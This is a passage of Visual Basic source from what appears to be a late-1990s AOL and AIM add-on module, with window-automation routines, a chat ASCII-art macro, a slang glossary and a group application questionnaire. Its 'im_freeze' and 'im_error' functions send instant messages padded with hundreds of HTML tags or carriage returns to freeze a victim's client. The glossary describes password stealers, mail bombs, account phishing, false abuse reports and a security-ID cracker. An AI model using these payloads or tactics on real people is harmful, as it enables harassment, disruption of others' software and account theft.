    Call EnableWindow(lngicon2&, True)
    For Index& = 0& To 20&
        Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
        Call EnableWindow(lngicon&, True)

    Next Index&
    Let lngcombo& = FindWindowEx(lngtoolbar&, 0&, "_aol_combobox", vbNullString)
End Sub
Sub Macro_BeaR()
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...
sPrompt = "Name uv Person" 'Set the prompt...
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X
sName$ = InputBox$(sPrompt, "Enter Name of Perzon The Bear iz f0r", , iXPos, iYPos)    'Display box, get input
If sName$ = "" Then
Else
SendchAt3 ".                             &&&&"
SendchAt3 ".                           &&&&&&"
SendchAt3 ".                            &&&&&"
SendchAt3 ".                               &&&"
SendchAt3 ".                                  ^;"
SendchAt3 ".                                  ("
SendchAt3 ".            ,,,,          ,,,     ';"
SendchAt3 ".           (  O )''''( O )   ';"
SendchAt3 ".            ',;    ```    ;;'      ';"
SendchAt3 ".           (   @`~`@   )    ';"
SendchAt3 ".       ,,,,,, ~ (_o_) ~,,,,,,';"
SendchAt3 ".      (  O )   (        )  ( O  )"
SendchAt3 ".           (    {         }   )"
SendchAt3 ".             ,,, \,,,,,,,,/ ,,,"
SendchAt3 ".            (_O )'''''( O_)"
SendchAt3 ".~<3" + sName$ + "~<3~"
SendchAt3 "."
TimeOut (2)
End If
End Sub

Function NextOfClass(hwnd As Long) As Long
Dim sClass$, hParent&
sClass = GetClass(hwnd)
hParent = GetParent(hwnd)
NextOfClass = FindWindowEx(hParent, hwnd, sClass, vbNullString)
End Function


Function im_error(Person As String)
theerror$ = Format$(String$(1024, Chr$(13)))
imerror = theerror$
Call MazTa_SendIM(Person$, theerror$ + " ")
End Function


Function im_freeze(Person$)
Call MazTa_SendIM((Person$), (".<h3><s><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3></s></u>"))
End Function

Sub Ouwop_Define(word, text1 As TextBox)
'ouwop
List1 = LCase(word)
If List1 = ("script") Then text1.Text = "Setz focuz on whatever the programmer Scriptz the programming language to"
If List1 = ("popup window") Then text1.Text = "While Browsing the net you git little windows that (popup) advertizing shit, thoze are called popup windowz"
If List1 = ("krap") Then text1.Text = "something do0dy called krep by mistake"
If List1 = ("ucase") Then text1.Text = "Upper Case Characterz"
If List1 = ("tard") Then text1.Text = "someone who thinkz theyre above tha ieet0 or skilled ao person(z)"
If List1 = ("lcase") Then text1.Text = "Lower Case Characterz"
If List1 = ("gimp") Then text1.Text = "something do0dy calls u tards when he bored"
If List1 = ("reported") Then text1.Text = "something do0dy doez without a reazon"
If List1 = ("mb") Then text1.Text = "MailBomb, Sendz a specific victim a specific # uv Emailz Fazt"
If List1 = ("xed") Then text1.Text = "Commonly uzed for Ignore"
If List1 = ("clone") Then text1.Text = "Having 2 or more SN'z Online at once"
If List1 = ("peace") Then text1.Text = "fag from vb"
If List1 = ("unix") Then text1.Text = "a OS uzed mainly by Buizness'z"
If List1 = ("deltree") Then text1.Text = "A Command that Deletez a File so itz UnRetrievable"
If List1 = ("wave") Then text1.Text = "tha Name of a Certain Muzik File"
If List1 = ("wav") Then text1.Text = "tha Extension for a Wave File, (Muzik File)"
If List1 = ("language") Then text1.Text = "A style of Programmin or making the Computer Understand Exactly what to do"
If List1 = ("java") Then text1.Text = "Web Page Programmin Language"
If List1 = ("html") Then text1.Text = "Code to make web pagez or different stringz of text"
If List1 = ("pws") Then text1.Text = "Password Stealer, a viruz if ran infectz your compz startup file to be ran everytime you load your comp, when u sign on it sendz whoever the pws was made to sedn to your SN'z , PW'z for all your Account SN'z"
If List1 = ("trojan") Then text1.Text = "See PWS"
If List1 = ("hotmail") Then text1.Text = "A Free Email Domain"
If List1 = ("maximize") Then text1.Text = "The Little Square on da top right of you Windows Applicationz, Makez a window bigger, (Maxed)"
If List1 = ("sn") Then text1.Text = "Screen Name, what ppl on the net identifyz you bye"
If List1 = ("pw") Then text1.Text = "Password, No Definition needed"
If List1 = ("ool") Then text1.Text = "Ouwop Online, So0n to come >;/"
If List1 = ("decrypt") Then text1.Text = "Decodez a Encrypted Text"
If List1 = ("encrypt") Then text1.Text = "A way of Disquising text so it cant be easily understood unlezz u have the decrypter code or program"
If List1 = ("msg") Then text1.Text = "Message"
If List1 = ("timeout") Then text1.Text = "a pause for a specific amount of time"
If List1 = ("app") Then text1.Text = "A Application for whateva da Makuh makez it for"
If List1 = ("idle") Then text1.Text = "Same az AFK w/lezz Advertize"
If List1 = ("afk") Then text1.Text = "Away from keyboard"
If List1 = ("im") Then text1.Text = "Instant Message"
If List1 = ("ppl") Then text1.Text = "People"
If List1 = ("decompile") Then text1.Text = "A program uzed to take apart other peoplez programz, i hate ppl like dat so i made a decompile protecter on mazta progg >;]"
If List1 = ("link") Then text1.Text = "A Text Made up of a Specific URL for a uzer or receiver to Simply Click on and it sendz them to tha specified Location"
If List1 = ("ftp") Then text1.Text = "File Transfer Progress"
If List1 = ("www") Then text1.Text = "World Wide Web"
If List1 = ("advertize") Then text1.Text = "Sendz Text mainly to a chat room or wherever the programmer set it up to send"
If List1 = ("shell") Then text1.Text = "a string that openz a file through VB and other variouz OS n Programz"
If List1 = ("string") Then text1.Text = "A line of code in various wayz"
If List1 = ("os") Then text1.Text = "Operating System, da name of your system (windows, Dos, Unix, ext..)"
If List1 = ("dos") Then text1.Text = "A OS made by microsoft that windows runz off uv"
If List1 = ("hex") Then text1.Text = "Editing Filez to make them work better or learn how they were made"
If List1 = ("ieet") Then text1.Text = "Hacking , Hexing, Ext..."
If List1 = ("viruz") Then text1.Text = "A Code Setup in a file to infect whateva the programmer makez it do, not alwayz bad, everybody haz viruz'z on there comp in some way, all thoze viruz protection programz are viruz'z, viruz'z settup to find bad viruz'z, but thoze viruz protection proggz wont protect yo azz from ouwopz mazta viruz lab fo0 >;]"
If List1 = ("macro") Then text1.Text = "A Combination of Char'z To Form a Picture of some sort"
If List1 = ("elite") Then text1.Text = "A style of changin your char'z to a more unique look"
If List1 = ("phade") Then text1.Text = "A set of colorz phaded together to make your text a certain style"
If List1 = ("pizza") Then text1.Text = "food u dumb fuck >;]"
If List1 = ("brb") Then text1.Text = "Be Right Back"
If List1 = ("lmao") Then text1.Text = "Laughing My Azz Off"
If List1 = ("bolmao") Then text1.Text = "Buztin Out Laughin My azz Off"
If List1 = ("ixi") Then List1 = "IXI": text1.Text = "Tha Tag For Are Group, Duznt Abreeviate Anything"
If List1 = ("ouwop") Then text1.Text = "Some say itz 2 bluntz rolled together, but some say hez your mazter to >;c"
If List1 = ("char") Then text1.Text = "a keyboard Character A-Z 0-9 ext... Any keyboard Letter # or Character"
If List1 = ("extension") Then text1.Text = "the lazt 3 letterz to identify a file type"
If List1 = ("txt") Then text1.Text = "iz da extension for a text file"
If List1 = ("*.*") Then text1.Text = "* = everything . = to , for a total uv everything to everything, it tellz wuteva your doin to look at all filez (*.*)"
If List1 = "<><" Then text1.Text = "Symbol For Phish, See Phish"
If List1 = "address" Then text1.Text = "A URL of a specific Location"
If List1 = "aim" Then text1.Text = "AOL Instant Messanger, a program made by AOL uzed to Instant Message (im) people from any IP, Upgradez constantly, Now u can Chat with it, itz werth da D/L"
If List1 = "aol" Then text1.Text = "America Online, a Host That your probably Connected through right now"
If List1 = "ascii" Then text1.Text = "A Combination of Characterz to make your Charz look different"
If List1 = "bas" Then text1.Text = "the Extention for a Module File"
If List1 = "bol" Then text1.Text = "Buztin out laughin, made by Ouwop and Mille early January when IXI wuz founded"
If List1 = "c" Then text1.Text = "A Programming Language Made by Borland"
If List1 = "class" Then text1.Text = "A Type of File As a Module"
If List1 = "client" Then text1.Text = "iz responisble for initiating the connection to da server"
If List1 = "cls" Then text1.Text = "VB Programmin Code Also Known Az Clear"
If List1 = "com" Then text1.Text = "Commerical Oraganizationz, also known as a Domain"
If List1 = "combo box" Then text1.Text = "A Entry or Selective Field uzed to Show or Recieve Data"
If List1 = "domain" Then text1.Text = "a type of organization that a netwerk belongz to with sub domainz following, example [.net .com .edu .gov] ext...."
If List1 = "hozt" Then text1.Text = "a dot-notation or logical name for a server that breakz up into a domain for multi uzerz to connect with each other from"
If List1 = "ie" Then text1.Text = "Internet Explorer, a Program made by Microsoft uzed to browse the internet aka Browser"
If List1 = "ip" Then text1.Text = "Internet Protocol, letz any system connect as if they were the same netwerk, as if they were there seperate Host'z, each has a unique assigned 32bit number wich iz uzed to identify it ova da netwerk, but itz broken into 8-bit numberz seperated by periodz, see Dot-Notation"
If List1 = "kw" Then text1.Text = "Keyword, commonly uzed from AOL to reach specific Destinationz"
If List1 = "lag" Then text1.Text = "Would you believe me if i told you i made thiz werd up?, yez back in 1994 when i wuz part of DOERS, my first group, that group actually went public, see Friends-Doers, anywayz Lag meanz when your comp goez slow and iz low on memery it causez your compz cpu power to decreaze"
If List1 = "list box" Then text1.Text = "See Combo Box, Same Definition"
If List1 = "memory" Then text1.Text = "Everything you load or run on your comp putz itself into your compz memery for eazier loadin, az in if you load mazta prog for the firzt time it takez a little longer then the second time. each comp variez on amount of memery dependin on if you can afford it, shitz expensive"
If List1 = "mm" Then text1.Text = "Mass Mail, a program made to Mass Email uzer selected filez to uzer selected people"
If List1 = "module" Then text1.Text = "a File made from VB that gatherz your Subz, functionz, declarationz n callz for easy access incase you wanna create a new project you dont have to re-type all your code, see BAS"
If List1 = "net" Then text1.Text = "see Domain"
If List1 = "netscape" Then text1.Text = "See IE, same definition"
If List1 = "phish" Then text1.Text = "A account that iznt yourz , Not stolen by anyone, really dependz on peoplez stupidnezz, there iz no skill involved in <><ing, but they do come in handy"
If List1 = "pr" Then text1.Text = "Private ro0m, a room created on AOL [private]"
If List1 = "prez" Then text1.Text = "Prezident, Owner, or runner of a group"
If List1 = "protocol" Then text1.Text = "a piece of software uzed to create through differnt internetz, see ip"
If List1 = "punt" Then text1.Text = "kickz someone offline by freezin there aol or comp in various different wayz"
If List1 = "qbasic" Then text1.Text = "a begginerz programming language"
If List1 = "root" Then text1.Text = "where everything startz, the core"
If List1 = "serve" Then text1.Text = "a program uzed to send email to requezterz from a chat room on aol"
If List1 = "server" Then text1.Text = "www.(server).com"
If List1 = "socket" Then text1.Text = "a piece of hardware or software in your comp set on the ip to connect to a network"
If List1 = "steveCase" Then text1.Text = "many people hate this guy cuz he made aol, but you are uzing hiz shit your on aol so dont playa hate him, hez very edjucated n im sure he haz made loot so have some respect"
If List1 = "submit" Then text1.Text = "something the uzer activated that sendz specific data to a specific domain"
If List1 = "tcp" Then text1.Text = "Transmission Control Protocol, uzed to exchange infromation or signalz from another internet from severral componnetz"
If List1 = "term" Then text1.Text = "gives a person a extra TOS violation, Emailz a AOL Employee saying false infromation in order to git your account 1 step furthur to being killed"
If List1 = "text box" Then text1.Text = "see Listbox, same Definition"
If List1 = "tos" Then text1.Text = "Terms Of service, the aggreement you probably didnt read while signin up for AOL, KW- [tos]"
If List1 = "udp" Then text1.Text = "A protocol such az tcp/ip but much fazter, iz known to looze data so really allz itz good for iz speed"
If List1 = "vb" Then text1.Text = "Visual Basicz, a programming language"
If List1 = "version" Then text1.Text = "a set of numberz set by the programmer to identify differnt typez of a program"
If List1 = "vp" Then text1.Text = "Vice Prezident, Runz shit while da prez iznt around, has az much say az da prez"
If List1 = "dot-notation" Then text1.Text = "a ip # broke down into 8-bit"
If List1 = "#" Then text1.Text = "Number"
If List1 = "network" Then text1.Text = "A service which you connect to"
If List1 = "cpu" Then text1.Text = "Central Proccessin Unit, your computerz brain, everything iz ran from diz"
If List1 = "sub" Then text1.Text = "A VB Programmin Code written to do uzer defined shit"
If List1 = "function" Then text1.Text = "A VB Programmin Code written to do uzer defined shit and return uzer defined valuez"
If List1 = "call" Then text1.Text = "a vb programmin code to set focus to a sub or function"
If List1 = "menu" Then text1.Text = "a tool uzed to gather specific infromation in one place for access"
If List1 = "telnet" Then text1.Text = "providez terminal emulation servicez for a remote hozt"
If List1 = "polling" Then text1.Text = "when a program periodically attemptz to read or write data from a scoket uzeing a timer"
If List1 = "pussy" Then text1.Text = "wut every lonely man wuntz such az maself >;["
If List1 = ("url") Then text1.Text = "a Location for a Web Site"
If List1 = ("error") Then text1.Text = "a glitch in a program causing it to shut off or not operate correctly, usualyy trigered by the uzer"
If List1 = ("runtime error") Then text1.Text = "A error cauzed by the program not by the uzer"
If List1 = ("pb") Then text1.Text = "a public chat room on aol"
If List1 = ("<m><") Then List1 = "<.m><": text1.Text = "a master account phish"
If List1 = ("master") Then text1.Text = "a main aol account"
If List1 = ("<s><") Then List1 = "<.s><": text1.Text = "a sub account created off a master <><"
If List1 = ("oh") Then text1.Text = "OverHead Account, a aol account thatz above regular account, doez alot of special shit, i made OH to0lz on here incase you have a OH"
If List1 = ("sid") Then text1.Text = "security i.d, uzed for accezz to cat or oh accountz, uzually 6 digitz hard to crack but i made a cracker"
If List1 = ("cat") Then text1.Text = "A aol amployee that watchez over private roomz and illegal activitiez on aol"
If List1 = ("guide") Then text1.Text = "Same as Cat but Public roomz instead of private"
If text1.Text = "" Then
sendchat ("‹íÍì›<b>" + word + "</b> <I>Not Found....</i>")
Else
sendchat ("‹íÍì›<b>" + word + "</b> <i>" + text1)
End If
text1.Text = ""
End Sub
Sub PercentBar(Shape As Control, Done, Total As Variant)
'Call PercentBar(Picture1, Label1.Caption, Label2.Caption)
'where Label1 is how many mails have
'already been forwarded, and Label2 is
'how many total mails there are.
On Error Resume Next
Shape.AutoRedraw = True
Shape.FillStyle = 0
Shape.DrawStyle = 0
Shape.FontName = "MS Sans Serif"
Shape.FontSize = 8.25
Shape.FontBold = False
X = Done / Total * Shape.Width
Shape.Line (0, 0)-(Shape.Width, Shape.Height), RGB(255, 255, 255), BF
Shape.Line (0, 0)-(X - 10, Shape.Height), RGB(0, 0, 255), BF
Shape.CurrentX = (Shape.Width / 2) - 100
Shape.CurrentY = (Shape.Height / 2) - 125
Shape.ForeColor = RGB(255, 0, 0)
Shape.Print Percent(Done, Total, 100) & "%"
End Sub


 Function Percent(Complete, Total As Variant, TotalOutput As Integer) As Integer
On Error Resume Next
Percent = Int(Complete / Total * TotalOutput)
End Function



Function Errored(lpBox As ListBox, lpDeadBox As ListBox) As Integer
Dim hMain&, hView&, hRemoved&, nCount%, sText$, sTest$
Dim nInstr%
 OpenSend& = FindWindowEx(AolMdi, 0&, "AOL Child", "Write Mail")
 EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)

hMain = FindWindowEx(AolMdi, 0, "AOL Child", "Error")
hView = FindWindowEx(hMain, 0, "_AOL_View", vbNullString)
If hView = 0 Then
    Errored = 0
    Exit Function
End If
sText = gettext(hView)
sText = Mid(sText, 67)
While InStr(1, sText, " - ") <> 0
    nInstr = InStr(1, sText, " - ")
   arf = LCase(RemoveSpace(Mid(sText, 1, nInstr - 1)))
 lpDeadBox.AddItem arf
If InStr(EditTo&, (arf)) Then Call RePlacestRing(EditTo&, arf, "")
   sText = Mid(sText, nInstr + 3)
    nInstr = InStr(nInstr + 1, sText, Chr(13))
    sText = Mid(sText, nInstr + 2)
Wend
For nCount = 0 To lpDeadBox.listcount - 1
If InStr(EditTo&, (arf)) Then Call RePlacestRing(EditTo&, arf, "")
   hRemoved = SendMessageByString(lpBox.hwnd, LB_FINDSTRING, -1, lpDeadBox.list(nCount))
    If hRemoved& <> -1 Then lpBox.RemoveItem hRemoved&
Next nCount

Do
    DoEvents
    Call PostMessage(hMain, WM_CLOSE, 0, 0)
Loop Until IsWindow(hMain) = 0
End Function

Function Errored_Clik()
Dim hMain&, hView&, hRemoved&, nCount%, sText$, sTest$
Dim nInstr%
 OpenSend& = FindWindowEx(AolMdi, 0&, "AOL Child", "Write Mail")
 EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)

hMain = FindWindowEx(AolMdi, 0, "AOL Child", "Error")
Do
    DoEvents
    Call PostMessage(hMain, WM_CLOSE, 0, 0)
Loop Until IsWindow(hMain) = 0
End Function





Function AIM_Formatsn(NewSN As String)
'ouwop
d$ = NewSN$
If RemoveSpace(LCase(d$)) = RemoveSpace(LCase(AIM_UserSN)) Then
Call AIM_RunMenu2(0&, 5&, 2&) 'format sn
TimeOut (1)
Do
DoEvents:
TimeOut (0.1)
   lngp& = FindWindow("#32770", vbNullString)
   lng& = FindWindowEx(lngp&, 0&, "Edit", vbNullString)
   lngb& = FindWindowEx(lngp&, 0&, "button", vbNullString)
Loop Until lngp& <> 0& And lng& <> 0& And lngb& <> 0&
TimeOut (0.1)
Call SetText(lng&, d$)
TimeOut (0.5)
Clicker (lngb&)
Call wait4OK_2("Information", "OK")
Else
MsgBox "AIM Screen Name giving duznt match main screen name", vbCritical, "Err0r!"
End If
End Function



Sub AIM_PhisH(check1 As CheckBox, text4 As TextBox, list2 As ListBox)
'wop
'for my auto responda
dat$ = AIM_ImText
If dat$ = "" Then Exit Sub
list2.AddItem dat$
TimeOut (0.2)
Call AIM_RespondA(text4)
TimeOut (0.1)
If check1.Value = 1 Then ItalicSendChat (dat$)
TimeOut (0.1)
AIM_CloseIM
End Sub


Sub AIM_UpdateEmail(NewEMAIL As String)
'ouwop
If NewEMAIL$ = "" Then MsgBox "No Email Addrezz Giving to Update!", vbCritical, "Err0r!": Exit Sub
Call AIM_RunMenu2(0&, 5&, 3&)
TimeOut (1)
Do
DoEvents:
TimeOut (0.1)
lngp& = FindWindow("#32770", vbNullString)
lng& = FindWindowEx(lngp&, 0&, "Edit", vbNullString)
ad$ = GetWindow(lng&, GW_HWNDNEXT)
ad$ = GetWindow(ad$, GW_HWNDNEXT)
lngb& = FindWindowEx(lngp&, 0&, "button", vbNullString)
Loop Until lngp& <> 0& And lng& <> 0& And lngb& <> 0&
TimeOut (0.2)
Call SetText(ad$, NewEMAIL$)
TimeOut (0.5)
Clicker (lngb&)
Call wait4OK_2("Information", "OK")
End Sub
Sub AIM_GeTinfo(Who As String)
'ouwop
If Who$ = "" Then MsgBox "No1 named to git info about...", vbCritical, "Err0r!": Exit Sub
Call AIM_RunMenu(1&, 2&)
TimeOut (1)
Do
DoEvents:
TimeOut (0.1)
Dim aim As Long, box As Long, Go As Long
aim& = FindWindow("_Oscar_Locate", vbNullString)
box& = FindWindowEx(aim&, 0&, "Edit", vbNullString)
but& = FindWindowEx(aim&, 0&, "button", vbNullString)
Loop Until aim& <> 0&
MsgBox gettext(box&)
TimeOut (0.1)
Call SetText(box&, Who$)
TimeOut (0.5)
Clicker (but&)
End Sub
Sub IXI_APP(yurEmail As String)
MsgBox "There iz 3 Stepz to thiz Application" + Chr(10) + "A total uv 74 Queztionz" + Chr(10) + Chr(10) + "If you do not know one of the queztion, Just hit 'OK'", 64, "IXI Applicati0n"
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...
IB_TITLE = "IXI Auto Application"
sPrompt = "Enter your web page if any" 'Set the prompt...
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X
a$ = InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)    'Display box, get input
sPrompt = "Enter your Handle" 'Set the prompt...
X = sPrompt
sPrompt = X
a1$ = "Handle - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Enter your Email Addrezz" 'Set the prompt...
X = sPrompt
sPrompt = X
a2$ = "Email - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Legal AOL Screen Name?" 'Set the prompt...
X = sPrompt
sPrompt = X
a3$ = "Legal AOL - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Your AIM Name?" 'Set the prompt...
X = sPrompt
sPrompt = X
a4$ = "AIM - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
MsgBox "Now i will az you what you think shit meanz", 64, "Step2"
sPrompt = "Hexing = " 'Set the prompt...
X = sPrompt
sPrompt = X
a5$ = "Hexing - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Phreaking =" 'Set the prompt...
X = sPrompt
sPrompt = X
a6$ = "Phreaking - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Hacking = " 'Set the prompt...
X = sPrompt
sPrompt = X
a7$ = "Hacking - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Phishing =" 'Set the prompt...
X = sPrompt
sPrompt = X
a8$ = "Phishing - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Retrieving = " 'Set the prompt...
X = sPrompt
sPrompt = X
a9$ = "Retrieving - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "serve =" 'Set the prompt...
X = sPrompt
sPrompt = X
a10$ = "Serve - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "mm =" 'Set the prompt...
X = sPrompt
sPrompt = X
a11$ = "MM - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "flag =" 'Set the prompt...
X = sPrompt
sPrompt = X
a12$ = "flag - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)  'Display box, get input
'''''''''''
sPrompt = "reset =" 'Set the prompt...
X = sPrompt
sPrompt = X
a13$ = "reset - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "virus =" 'Set the prompt...
X = sPrompt
sPrompt = X
a14$ = "viruz - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "deltree =" 'Set the prompt...
X = sPrompt
sPrompt = X
a15$ = "deltree - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "virill" 'Set the prompt...
X = sPrompt
sPrompt = X
a16$ = "virill - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "url =" 'Set the prompt...
X = sPrompt
sPrompt = X
a17$ = "url - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "PR =" 'Set the prompt...
X = sPrompt
sPrompt = X
a18$ = "pr - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "IM =" 'Set the prompt...
X = sPrompt
sPrompt = X
a19$ = "im - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Punt =" 'Set the prompt...
X = sPrompt
sPrompt = X
a20$ = "punt - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "AIM =" 'Set the prompt...
X = sPrompt
sPrompt = X
a21$ = "aim - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Hotmail" 'Set the prompt...
X = sPrompt
sPrompt = X
a22$ = "hotmail - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "zip =" 'Set the prompt...
X = sPrompt
sPrompt = X
a23$ = "zip - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "cd =" 'Set the prompt...
X = sPrompt
sPrompt = X
a24$ = "cd - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "3 1/2 =" 'Set the prompt...
X = sPrompt
sPrompt = X
a25$ = "3 1/2 - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "click =" 'Set the prompt...
X = sPrompt
sPrompt = X
a26$ = "click - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''"??"
sPrompt = "IXI =" 'Set the prompt...
X = sPrompt
sPrompt = X
a27$ = "IXI - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "PB =" 'Set the prompt...
X = sPrompt
sPrompt = X
a28$ = "PB - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Mem =" 'Set the prompt...
X = sPrompt
sPrompt = X
a29$ = "Mem - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "ppl =" 'Set the prompt...
X = sPrompt
sPrompt = X
a30$ = "ppl - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "version =" 'Set the prompt...
X = sPrompt
sPrompt = X
a31$ = "version - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "WwW =" 'Set the prompt...
X = sPrompt
sPrompt = X
a32$ = "www - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "i.e = " 'Set the prompt...
X = sPrompt
sPrompt = X
a33$ = "i.e - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Netscape =" 'Set the prompt...
X = sPrompt
sPrompt = X
a34$ = "netscape - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Browser = " 'Set the prompt...
X = sPrompt
sPrompt = X
a35$ = "browser - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "TOS = " 'Set the prompt...
X = sPrompt
sPrompt = X
a37$ = "tos - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "BOL =" 'Set the prompt...
X = sPrompt
sPrompt = X
a38$ = "bol - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "HTML =" 'Set the prompt...
X = sPrompt
sPrompt = X
a39$ = "html - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "LOL =" 'Set the prompt...
X = sPrompt
sPrompt = X
a40$ = "lol - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "INT =" 'Set the prompt...
X = sPrompt
sPrompt = X
a41$ = "int - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "EMP =" 'Set the prompt...
X = sPrompt
sPrompt = X
a42$ = "emp - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Char =" 'Set the prompt...
X = sPrompt
sPrompt = X
a43$ = "char - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "ascii =" 'Set the prompt...
X = sPrompt
sPrompt = X
a44$ = "ascii - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Unix =" 'Set the prompt...
X = sPrompt
sPrompt = X
a45$ = "unix - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Upload =" 'Set the prompt...
X = sPrompt
sPrompt = X
a46$ = "upload - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "DL =" 'Set the prompt...
X = sPrompt
sPrompt = X
a47$ = "dl - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
